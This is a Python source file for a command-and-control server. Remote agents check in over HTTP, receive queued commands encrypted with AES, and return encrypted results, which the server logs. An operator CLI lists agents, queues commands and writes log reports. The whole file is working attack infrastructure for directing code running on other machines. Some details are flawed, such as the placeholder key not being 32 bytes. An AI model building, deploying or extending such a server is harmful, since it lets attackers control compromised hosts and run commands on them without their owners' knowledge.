from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict
import typer
import logging
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = FastAPI()
cli = typer.Typer()
agents: Dict[str, Dict] = {}

logging.basicConfig(filename="c2_server.log", level=logging.INFO)

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

def encrypt_data(data: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(data: str, key: bytes) -> str:
    iv = base64.b64decode(data[:24])
    ct = base64.b64decode(data[24:])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        return encrypt_data(command, key)
    return encrypt_data("", key)

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    result = decrypt_data(request.Result, key)
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    logging.info(f"Agent {agent_id} executed command with result: {result}")
    return {"Status": "OK"}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

@cli.command()
def list_agents():
    """List all registered agents."""
    for agent_id in agents:
        typer.echo(f"Agent ID: {agent_id}, Pending Commands: {len(agents[agent_id]['commands'])}")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        typer.echo(f"Command sent to agent {agent_id}")
    else:
        typer.echo(f"Agent {agent_id} not found")

@cli.command()
def generate_report():
    """Generate a detailed report from the logs."""
    with open('c2_server.log', 'r') as log_file:
        report = log_file.read()
    with open('report.txt', 'w') as report_file:
        report_file.write(report)
    typer.echo("Report generated as report.txt")

if __name__ == "__main__":
    import uvicorn
    import threading

    key = b'your_32_byte_key_here'  # Replace with your 32-byte key

    def run_server():
        uvicorn.run(app, host="0.0.0.0", port=8000)

    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    cli()
